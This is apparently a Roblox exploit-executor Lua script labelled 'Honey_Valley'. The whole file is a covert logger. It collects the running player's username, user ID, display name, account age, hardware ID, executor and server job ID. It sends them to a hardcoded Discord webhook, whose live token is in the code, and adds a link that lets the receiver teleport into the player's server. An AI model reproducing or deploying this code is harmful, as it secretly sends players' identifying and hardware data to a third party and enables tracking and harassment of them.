if _G.Honey_Valley then
  warn("Script Is fucking Already running",0) 
    return
end

_G.Honey_Valley = true
local http_request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)

local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local hookURL = "https://discord.com/api/webhooks/1331561807894151209/7pfnnAqhUBaXrIWiitb4sw7PkqWtWYUFPfBgRuOlytf-w49U_0oYQWiyOrcG9dqaA2na"

function thumbnail(plyId)
    local url = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. plyId .. "&returnPolicy=PlaceHolder&size=75x75&format=Png&isCircular=false"
    
    local response = http_request({
        Url = url,
        Method = "GET",
        Headers = {
            ["Content-Type"] = "application/json"
        }
    })
    
    local data = HttpService:JSONDecode(response.Body)
    return data["data"][1]["imageUrl"]
end

local player = game.Players.LocalPlayer
local userid = player.UserId
local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
local gameId = game.PlaceId
local job = game.JobId

local identifyexecutor = identifyexecutor() or "Unknown Executor"

local data = {
    embeds = {
        {
            color = 14177041,
            title = "Player Information",
            description = "Information about the local player.",
            thumbnail = {
                url = thumbnail(player.UserId)
            },
            fields = {
                {
                    ["name"] = "Game Name",
                    ["value"] = gameInfo.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Game Link",
                    ["value"] = "[Click to see](https://www.roblox.com/games/" .. game.PlaceId .. ")",
                    ["inline"] = true
                },
                {
                    ["name"] = "Place ID",
                    ["value"] = tostring(game.PlaceId),
                    ["inline"] = true
                },
                {
                    ["name"] = "Username",
                    ["value"] = "[Visit profile](https://www.roblox.com/users/" .. player.UserId .. "/profile)",
                    ["inline"] = true
                },
                {
                    ["name"] = "Display Name",
                    ["value"] = player.DisplayName,
                    ["inline"] = true
                },
                {
                    ["name"] = "User ID",
                    ["value"] = tostring(player.UserId),
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Age",
                    ["value"] = tostring(player.AccountAge) .. " days",
                    ["inline"] = true
                },
                {
                    ["name"] = "Hardware ID",
                    ["value"] = HWID,
                    ["inline"] = false
                },
                {
                    ["name"] = "Executor",
                    ["value"] = identifyexecutor,
                    ["inline"] = true
                },
                {
                    ["name"] = "𝗦𝗻𝗶𝗽𝗲 𝗠𝗲 ❗ Teleport To Place Where Player Executed",
                    ["value"] = "[Click here to teleport](https://thehunt.click/?placeId=" .. gameId .. "&gameInstanceId=" .. job .. ")",
                    ["inline"] = false
                }
            },
            footer = {
                ["text"] = "Information sent via script"
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }
}

local success, errorMessage = pcall(function()
    http_request({
        Url = hookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(data)
    })
end)

if not success then
    warn("Failed to send data to the webhook: " .. errorMessage)
end
